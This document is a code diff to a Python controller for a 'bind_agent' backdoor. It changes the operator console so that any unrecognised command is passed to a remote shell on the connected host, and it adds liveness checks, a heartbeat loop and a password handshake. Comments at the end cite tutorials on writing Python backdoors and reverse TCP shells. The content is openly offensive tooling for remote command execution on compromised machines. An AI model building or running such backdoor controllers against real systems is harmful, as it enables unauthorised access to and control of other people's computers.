@@ -1,5 +1,6 @@
 import sys
 import glob
+import time
 import socket
 import modules
 import hashlib
@@ -12,9 +13,11 @@ from prettytable import PrettyTable
 
 
 class Agent(Cmd):
+# Agent prompt class, to define commands and interact with modules
     """Agent prompt to use modules and interact with agent"""
 
-    intro = 'Type help or ? to list commands.'
+    intro = 'Type help or ? to list commands. (default input will be send to a remote shell)'
+
 
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
@@ -24,10 +27,51 @@ class Agent(Cmd):
 
         """
 
+    def default(self, cmd):
+        """Override default method, to send unknow command to remote shell"""
+        try: 
+
+            modules.Shell(self.channel, cmd)
+
+        except ConnectionResetError:
+            print(colored(f"\n[-] Channel reset by peer", 'red'))
+            return True
+
+        except BrokenPipeError:
+            print(colored(f"\n[-] Channel reset by peer (broken pipe error)", 'red'))
+            return True
+
+
     def define_channel(self, arg):
         """Define the open socket to interact with agent"""
         self.channel = arg
 
+
+    def do_check(self, arg):
+
+        try:
+            bufferSize = BUFFER_SIZE
+            self.channel.sendall(b'alive ?')
+
+            while True:
+                rawResponse = self.channel.recv(bufferSize)
+                # If all data are smaller than the buffer size, break While loop
+                if len(rawResponse) < bufferSize:
+                    break
+            # Decode bytes to string to read the answer of the remote agent
+            checkAnswer = rawResponse.decode()
+            if checkAnswer == 'alive !':
+                print(colored(f"[+] Agent is alive", 'green'))
+
+        except ConnectionResetError:
+            print(colored(f"\n[-] Channel reset by peer", 'red'))
+            return True
+
+        except BrokenPipeError:
+            print(colored(f"\n[-] Channel reset by peer (broken pipe error)", 'red'))
+            return True
+        
+        
     def do_exit(self, arg):
         """Quit agent and close the channel"""
         self.channel.close()
@@ -37,14 +81,17 @@ class Agent(Cmd):
         """Try to switch to a shell"""
         while True:
             try:
-                modules.shell(self.channel)
+                #self.check_agent()
+                modules.Shell(self.channel)
             except KeyboardInterrupt:
                 break
+
 
     def do_status(self, arg):
         """Display information about open channel with agent"""
         print(self.channel)
-    
+
+
 
 
 
@@ -150,6 +197,8 @@ class Prompt(Cmd):
 # ------------------------------ Main ------------------------------
 # ------------------------------------------------------------------
 
+BUFFER_SIZE = 1024
+
 def startModule():
 
     
@@ -157,26 +206,6 @@ def startModule():
     subPrompt.prompt = f"({colored('bind_agent', 'yellow')}) > "
     subPrompt.cmdloop()
 
-
-def passwordChallenge(channel, password):
-
-    bufferSize = 1024
-
-    channel.sendall(password.encode())
-
-    while True:
-        challengeResponse = channel.recv(bufferSize)
-        if len(challengeResponse) < bufferSize:
-            break
-
-    answer = challengeResponse.decode()
-    if answer == hashlib.sha512(password.encode()).hexdigest():
-        answer = True
-    elif answer == ' ':
-        answer = False
-
-
-    return answer
 
 
 def bindAgent(dictionnary):
@@ -207,13 +236,13 @@ def bindAgent(dictionnary):
             channel.close()
             return
 
-
-
         try:
 
             agentPrompt = Agent()
-            agentPrompt.prompt = colored(f"agent@{host}:{port} >", 'green') 
+            agentPrompt.prompt = colored(f"agent@{host}:{port} > ", 'green') 
             agentPrompt.define_channel(channel)
+
+
             agentPrompt.cmdloop()
 
         except KeyboardInterrupt:
@@ -241,9 +270,48 @@ def bindAgent(dictionnary):
 
 
 
+def passwordChallenge(channel, password):
+
+    bufferSize = BUFFER_SIZE
+
+    channel.sendall(password.encode())
+
+    while True:
+        challengeResponse = channel.recv(bufferSize)
+        if len(challengeResponse) < bufferSize:
+            break
+
+    answer = challengeResponse.decode()
+    if answer == hashlib.sha512(password.encode()).hexdigest():
+        answer = True
+    elif answer == ' ':
+        answer = False
+
+
+    return answer
 
 
 
+
+def checkAgent(channel, objet):
+    
+    while True:
+
+
+        try:
+            channel.sendall(b'alive ?')
+
+        except ConnectionResetError:
+            print(colored(f"\n[-] Channel reset by peer", 'red'))
+            objet.do_exit()
+            break
+
+        except BrokenPipeError:
+            print(colored(f"\n[-] Channel reset by peer (broken pipe error)", 'red'))
+            objet.exit_prompt
+            break
+        
+        time.sleep(3)
 
     # https://www.shellvoide.com/python/how-to-hack-create-shell-backdoor-in-python/
     # https://0x00sec.org/t/how-to-make-a-reverse-tcp-backdoor-in-python-part-1/1038
